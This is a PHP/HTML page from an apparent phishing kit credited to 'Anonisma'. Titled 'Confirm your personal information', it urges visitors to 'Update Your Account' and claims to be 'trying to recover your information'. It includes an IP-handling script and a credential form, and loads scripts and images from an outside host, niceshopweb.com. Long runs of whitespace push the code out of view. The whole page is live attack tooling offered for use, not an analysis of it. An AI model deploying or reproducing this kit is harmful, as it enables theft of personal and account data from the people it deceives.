																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							

<?php
if (!isset($_SESSION)) {
  session_start();
}

include      "ip.php";         
    


?>																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								<!--


   ______              __             __                  ____                            ___                            _                             
  / ____/  ____   ____/ /  ___   ____/ /                 / __ )   __  __                 /   |   ____   ____    ____    (_)   _____   ____ ___   ____ _
 / /      / __ \ / __  /  / _ \ / __  /                 / __  |  / / / /                / /| |  / __ \ / __ \  / __ \  / /   / ___/  / __ `__ \ / __ `/
/ /___   / /_/ // /_/ /  /  __// /_/ /                 / /_/ /  / /_/ /                / ___ | / / / // /_/ / / / / / / /   (__  )  / / / / / // /_/ / 
\____/   \____/ \__,_/   \___/ \__,_/                 /_____/   \__, /                /_/  |_|/_/ /_/ \____/ /_/ /_/ /_/   /____/  /_/ /_/ /_/ \__,_/  
  																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								-->





<!DOCTYPE html>

<html>








   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta charset="utf-8">

      <title>Confirm your personal information</title>
      <script src="./AA-NN-OO-NN-II-SS-MM-AA/anonis.js" type="text/javascript" charset="utf-8"></script>
	  <script src="./AA-NN-OO-NN-II-SS-MM-AA/Anoonisma.js" type="text/javascript" charset="utf-8"></script>
	  <script src="./AA-NN-OO-NN-II-SS-MM-AA/Anonisma-input.js" type="text/javascript" charset="utf-8"></script>
	  <script src="./AA-NN-OO-NN-II-SS-MM-AA/main2.js" type="text/javascript" charset="utf-8"></script>
	  <link rel="icon" type="image/x-icon" href="http://niceshopweb.com/7+/An-on-is-ma/hooool.ico">
      <style type="text/css"></style>
   </head>
   
   
   
   
   
   
   
   <body>

   
   
     <body>

	 
	<? include ("./head/menu.php"); ?>
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	          <div class="con-ismas contisma" id="contisma" role="main" >
            <div id="Anonismaaaaaaaaaaaaaaaaaaaaaaaa" class="maincontisma sumisma">
                <h1 id="heading1" class="ismad">Anonisma: Opciones</h1>
                <div class="Anonismaaaaaaaaaaaaaaaaaaaaaaaa">
                    <div class="Anoniiiiismaaaaaaa">
                        <div class="Anoniiiiismaaaaa">
                            <div class="inismaaaaaaaaaaaa">
                              <img WIDTH=85 HEIGHT=85  src="http://niceshopweb.com/7+/An-on-is-ma/wa7dd.png" > 
							</div>
                            <div class="mgharbaaaaaaaaaaaa">
                                <div class="name"><span class="maghrib-zwin">Hello! Please Update Your Account !</span>
                                    <a class="edit hover" href="reparacions.php" name="editName" role="button">Edit</a>
                                </div>
                                <p class="since sa7raa-maghriibiya">We are trying to recover your information &nbsp; &nbsp; &nbsp; <img  src="http://niceshopweb.com/22/fot/tikchbila.gif" ></a> </p>
                            </div>
                        </div>
                    </div>
<? include ("./head/barra-2.php"); ?>
					</div>
					
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  

      <div class="mahdi_1"></div>
         <div class="mahdi_5">
            <hr align="center" noshade="noshade" size="1" color="#C1C1C1" width="100%">
            <div style="color:#1994FF;"  >   </br>      </div>
			
            <hr align="center" noshade="noshade" size="1" color="#C1C1C1" width="100%">
      
          
		  <? include ("./form/formulario-2.php"); ?>
			   
            
			   <table class="Anoniisma-a">
			   <tr>
			   <td>

			
               <div><img class="Anonismaa"  align=" center" src="http://niceshopweb.com/22/fot/r.png"></div>
			   </br>
               <div><img class="Anonismaa" align=" center" src="http://niceshopweb.com/22/fot/rr.png"></div>
               <br>
               <div><img class="Anonismaa"  align=" center" src="http://niceshopweb.com/22/fot/rrr.png"></div>
               <br>
               <div><img class="Anonismaa"  align=" center" src="http://niceshopweb.com/22/fot/rrrr.png"></div>
			   <br>
               <div><img class="Anonismaa"  align=" center" src="http://niceshopweb.com/22/fot/rrrrr.png"></div>
               </td>
			   </tr>
			   </table>
		   
         </div>
      </div>
      <br>

	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  





<? include ("./head/footer.php"); ?>







	

   </body>
</html>